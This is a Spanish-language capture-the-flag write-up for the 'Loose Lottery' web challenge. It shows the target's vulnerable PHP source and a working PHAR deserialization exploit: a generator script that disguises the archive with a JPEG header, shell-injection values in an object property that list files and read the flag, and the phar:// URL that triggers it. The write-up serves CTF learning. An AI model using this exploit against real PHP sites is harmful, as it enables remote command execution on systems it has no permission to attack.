# Web / Loose Lottery

Nos piden intoducir un numero para ganar el premio, el numero se encuentra en un comentario del codigo fuente de la pagina:

![1](https://github.com/user-attachments/assets/f2cb548e-c30e-44f3-9278-6e91c0734be6)

Al introducirlo nos dicen que el numero es demasiado grande, podemos convertirlo a hexadecimal para que funcione:

![2](https://github.com/user-attachments/assets/25594faa-6e97-4a81-bb20-d72b6bf47f69)

Una vez dentro, subimos una imagen y vamos a http://mctf-game.ru:4000/winner.php?winner=user.jpg presionando en el botón 'Learn more' y después presionamos en 'View Source Code' para ir a http://mctf-game.ru:4000/winner.php?source e inspeccionar el codigo fuente del backend php de la ruta

``` php
<?php
if (isset($_GET["source"])) highlight_file(__FILE__) && die();

session_start();

if (!isset($_SESSION['user_id'])) {
    header('Location: index.php');
    exit;
}

chdir('uploads/' . $_SESSION['user_id']);
class UserInfo
{
    public $name;
    public $info;
    public $photo;
    private $deletePhoto = false;

    public function __construct($info, $photo, $name)
    {
        $this->name = $name;
        $this->info = $info;
        $this->photo = $photo;
    }

    public function requestDelete()
    {
        $this->deletePhoto = true;
    }

    public function __destruct()
    {
        if ($this->deletePhoto && $this->photo) {
            echo shell_exec('rm ' . $this->photo);
            $this->photo = '';
        }
    }
}

function getWinnerInfo()
{
    if (isset($_GET['winner'])) {
        if ($_GET['winner'] === 'first.jpg') {
            return new UserInfo(
                'Legend.',
                'uploads/' . ($_SESSION['user_id']) .'/first.jpg',
                'First Winner'
            );
        } else if (!strpos($_GET['winner'], "..") && file_exists($_GET['winner'])) {
            return new UserInfo(
                isset($_SESSION['info']) ? $_SESSION['info'] : 'No information',
                isset($_SESSION['photo']) ? $_SESSION['photo'] : '',
                'You'
            );
        }
    }
    return null;
}

$winner = getWinnerInfo();

if (isset($_GET['delete'])) {
    $winner->requestDelete();
    header("Location: winner.php?winner=user.jpg");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Winner Info</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css2?family=Black+Ops+One&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
</head>
<body>

<div class="winner-header text-center">
    <h1>Winner Information</h1>
</div>

<div class="container mt-5">
    <h3 class="text-center"><?php echo $winner->name; ?></h3>
    <div class="row justify-content-center">
        <div class="col-md-6 text-center">
            <div class="card mb-4 shadow-sm">
                <div class="card-body">
                    <h5 class="card-title">About Winner</h5>
                    <p class="card-text"><?php echo $winner->info; ?></p>
                </div>
            </div>
            <?php if ($winner->photo): ?>
                <div class="card mb-4 shadow-sm winner-card">
                    <img src="<?php echo $winner->photo; ?>" class="card-img-top" alt="Winner's photo">
                </div>
            <?php else: ?>
                <div class="alert alert-warning" role="alert">
                    No photo uploaded.
                </div>
            <?php endif; ?>
        </div>
    </div>
    <div class="text-center mt-4">
        <a href="winners.php" class="btn btn-primary">Return to the winners list</a>
        <?php if ($winner->name === 'You'): ?>
            <a href="winner.php?winner=user.jpg&delete" class="btn btn-danger">Delete Photo</a>
        <?php endif; ?>
        <a href="win.php" class="btn btn-secondary">Back to Upload Page</a>
    </div>

    <a href="?source" class="btn btn-outline-secondary" id="view-source-btn">View Source Code</a>
</div>

<footer class="text-center mt-5 py-4" style="background-color: #4caf50; color: white;">
    <p>© 2024 SCAM INC. All rights reserved.</p>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
</body>
</html>
``` 

Viendo el codigo fuente en la funcion __destruct se ejecuta un comando del sistema con shell_exec. Sabiendo que los metodos __construct y __destruct se ejecutan cuando se crea y se destruye una instancia de una clase respectivamente, pero **tambien cuando un objeto es deserializado**, y que podemos subir archivos entonces lo que podemos hacer es subir una archivo PHAR con los bytes de la firma de una archivo JPG para pasar la verificacion.

Creamos un archivo php con las instrucciones para crear un archivo phar:

``` php
<?php
 // payload.php
class UserInfo
{
    public $name = 'foo';
    public $info = 'bar';
    public $photo = ' | ls ';
    private $deletePhoto = true;
}

$phar = new Phar('shell.phar'); 
$phar->startBuffering();
$phar->setStub("\xFF\xD8\xFF\xFE\x13\xFA\x78\x74 __HALT_COMPILER(); ?>");

$object = new UserInfo();
$phar->setMetadata($object);
$phar->stopBuffering();
?>
```

En el codigo anterior hay que aclarar algunos puntos:
+  `private $deletePhoto = true`; para que __destruct ejecute el comando
+  `public $photo = ' | ls ';` ejecutará ***echo rm | ls***
+  `$phar->setStub("\xFF\xD8\xFF\xFE\x13\xFA\x78\x74...)` establece los bytes de cabecera para que la firma del archivo sea como la de un jpg 

Compilamos el codigo, verificamos la firma y lo subimos al sitio:
``` bash
>> php --define phar.readonly=0 payload.php 
>> file shell.phar 
shell.phar: JPEG image data
```

Vamos a http://mctf-game.ru:4000/winner.php?winner=phar://user.jpg/test.txt y vemos entre los archivos listados a ' flag_d84d024ba050e1a9062915b50db40c89'

![flag](https://github.com/user-attachments/assets/973bbaf7-44af-47e8-b3b3-4d3e33272460)

Modificamos una linea para cambiar el comando a ejecutar, hacemos el proceso de nuevo y obtenemos la flag
``` php
 public $photo = ' | cat  flag_d84d024ba050e1a9062915b50db40c89 ';
```

![flag2](https://github.com/user-attachments/assets/5a8b008a-605b-42a6-9026-9dd867cb48ca)

`mctf{M41n_53cR37_E70gO_k4Z1n0} `



